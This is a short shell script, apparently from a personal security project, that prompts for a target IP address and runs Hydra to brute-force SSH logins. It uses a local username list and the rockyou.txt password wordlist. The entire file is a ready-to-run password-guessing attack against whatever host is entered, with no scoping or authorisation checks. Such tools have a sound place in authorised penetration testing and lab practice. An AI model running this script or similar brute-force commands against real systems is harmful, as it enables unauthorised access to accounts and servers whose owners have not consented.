echo -n "Target IP :" 
read Ip
sudo -S hydra -v -V -u -L ~/Desktop/Last_Project/usernames.txt -P /usr/share/wordlists/rockyou.txt -t 1 -u $Ip ssh 
